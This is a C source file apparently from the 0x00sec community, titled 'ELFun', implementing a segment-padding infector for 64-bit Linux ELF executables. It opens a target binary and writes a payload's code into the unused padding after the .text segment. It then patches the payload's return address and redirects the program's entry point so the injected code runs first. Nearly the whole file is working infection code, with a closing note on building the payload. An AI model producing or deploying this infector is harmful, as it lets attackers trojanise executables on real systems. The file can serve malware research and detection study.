/*
  ELFun
  Copyright (c) 2016 picoFlamingo

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

/*************************************************************
  Read the post at 0x00sec.org
  https://0x00sec.org/t/elfun-file-injector/410
**********************************************************************/

/* Segment padding infection */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>

#include <elf.h>
#include <sys/mman.h>

/* Helper functions */
static int 
get_file_size (int fd)
{
  struct stat _info;
  
  fstat (fd, &_info);

  return _info.st_size;
}

/* Open a file and map it in memory for easy update */
int
elfi_open_and_map (char *fname, void **data, int *len)
{
  int   size;
  int   fd;
  
  if ((fd = open (fname, O_APPEND | O_RDWR, 0)) < 0)
    {
      perror ("open:");
      exit (1);
    }
  
  size = get_file_size (fd);
  if ((*data = mmap (0, size, PROT_READ| PROT_WRITE| PROT_EXEC,
		    MAP_SHARED, fd, 0)) == MAP_FAILED)
    {
      perror ("mmap:");
      exit (1);
    }
  
  printf ("+ File mapped (%d bytes ) at %p\n", size, data);
  *len = size;
  return fd;
}


#ifdef DEBUG
/* Debug function to dump registers */
void
elfi_dump_segments (void *d)
{
  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) d;
  Elf64_Phdr* elf_seg;
  int         n_seg = elf_hdr->e_phnum;
  int         i;
 
  elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_hdr 
			    + (unsigned int) elf_hdr->e_phoff);
  for (i = 0; i < n_seg; i++)
    {    
	printf (" [INFO] Segment %d: Type: %8x (%x) Offset: %8x "
		"FSize:%8x MSize:%8x\n",
		i, elf_seg->p_type, elf_seg->p_flags, 
		(unsigned int)elf_seg->p_offset, 
		(unsigned int)elf_seg->p_filesz, 
		(unsigned int)elf_seg->p_memsz);

      elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_seg 
			    + (unsigned int) elf_hdr->e_phentsize);
    }

}
#endif


Elf64_Phdr*
elfi_find_gap (void *d, int fsize, int *p, int *len)
{
  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) d;
  Elf64_Phdr* elf_seg, *text_seg;
  int         n_seg = elf_hdr->e_phnum;
  int         i;
  int         text_end, gap=fsize;

  elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_hdr 
			    + (unsigned int) elf_hdr->e_phoff);

  for (i = 0; i < n_seg; i++)
    {
      if (elf_seg->p_type == PT_LOAD && elf_seg->p_flags & 0x011)
	{
	  printf ("+ Found .text segment (#%d)\n", i);
	  text_seg = elf_seg;
	  text_end = elf_seg->p_offset + elf_seg->p_filesz;
	}
      else
	{
	  if (elf_seg->p_type == PT_LOAD && 
	      (elf_seg->p_offset - text_end) < gap) 
	    {
	      printf ("   * Found LOAD segment (#%d) close to .text (offset: 0x%x)\n",
		      i, (unsigned int)elf_seg->p_offset);
	      gap = elf_seg->p_offset - text_end;
	    }
	}
      elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_seg 
			    + (unsigned int) elf_hdr->e_phentsize);
    }

  *p = text_end;
  *len = gap;

  printf ("+ .text segment gap at offset 0x%x(0x%x bytes available)\n", text_end, gap);

  return text_seg;
}



Elf64_Shdr *
elfi_find_section (void *data, char *name)
{
  char        *sname;
  int         i;
  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) data;
  Elf64_Shdr *shdr = (Elf64_Shdr *)(data + elf_hdr->e_shoff);
  Elf64_Shdr *sh_strtab = &shdr[elf_hdr->e_shstrndx];
  const char *const sh_strtab_p = data + sh_strtab->sh_offset;
   
  printf ("+ %d section in file. Looking for section '%s'\n", 
	  elf_hdr->e_shnum, name);
  
  
  for (i = 0; i < elf_hdr->e_shnum; i++)
    {
      sname = (char*) (sh_strtab_p + shdr[i].sh_name);
      if (!strcmp (sname, name))  return &shdr[i];
    }
  
  return NULL;
}

int
elfi_mem_subst (void *m, int len, long pat, long val)
{
  unsigned char *p = (unsigned char*)m;
  long v;
  int i, r;

  for (i = 0; i < len; i++)
    {
      v = *((long*)(p+i));
      r = v ^pat;

      if (r ==0) 
	{
	  printf ("+ Pattern %lx found at offset %d -> %lx\n", pat, i, val);
	  *((long*)(p+i)) = val;
	  return 0;
	}
    }
  return -1;
}

int
main (int argc, char *argv[])
{
  void        *d, *d1;
  int         target_fd, payload_fd;
  int         fsize, fsize1;
  Elf64_Ehdr* elf_hdr;
  Elf64_Phdr  *t_text_seg;
  Elf64_Shdr  *p_text_sec;
  Elf64_Addr  base, ep;
  int         p, len;


  printf ("Segment Padding Infector for 0x00sec\nby pico\n\n");
  if (argc != 3)
    {
      fprintf (stderr, "Usage:\n  %s elf_file payload\n", argv[0]);
      exit (1);
    }

  /* Open and map target ELF */
  target_fd = elfi_open_and_map (argv[1], &d, &fsize);

  /* Get Application Entry point */
  elf_hdr = (Elf64_Ehdr *) d;
  ep = elf_hdr->e_entry;
  printf ("+ Target Entry point: %p\n", (void*) ep);

#ifdef DEBUG  
  elfi_dump_segments (d);
#endif

  /* Find executable segment and obtain offset and gap size */
  t_text_seg = elfi_find_gap (d, fsize, &p, &len);
  base = t_text_seg->p_vaddr;

  printf ("+ Base Address : 0x%p\n", (void*)base);

  /* Process payload */
  payload_fd = elfi_open_and_map (argv[2], &d1, &fsize1);

  p_text_sec = elfi_find_section (d1, ".text");

  /* XXX: Looks like we do not really have to patch the segment sizes */
  /*
  t_text_seg->p_filesz += p_text_sec->sh_size;
  t_text_seg->p_memsz += p_text_sec->sh_size;
  */

  printf ("+ Payload .text section found at %lx (%lx bytes)\n", 
	  p_text_sec->sh_offset, p_text_sec->sh_size);

  if (p_text_sec->sh_size > len)
    {
      fprintf (stderr, "- Payload to big, cannot infect file.\n");
      exit (1);
    }
  /* Copy payload in the segment padding area */
  memmove (d + p, d1 + p_text_sec->sh_offset, p_text_sec->sh_size);

  /* Patch return address */
  elfi_mem_subst (d+p, p_text_sec->sh_size, 0x11111111, (long)ep);

  /* Patch entry point */
  elf_hdr->e_entry = (Elf64_Addr) (base + p);

  /* Close files and actually update target file */
  close (payload_fd);
  close (target_fd);

  return 0;
}


/*
Compile payload
nasm -f elf64 -o payload.o payload.asm;ld -o payload payload.o
*/
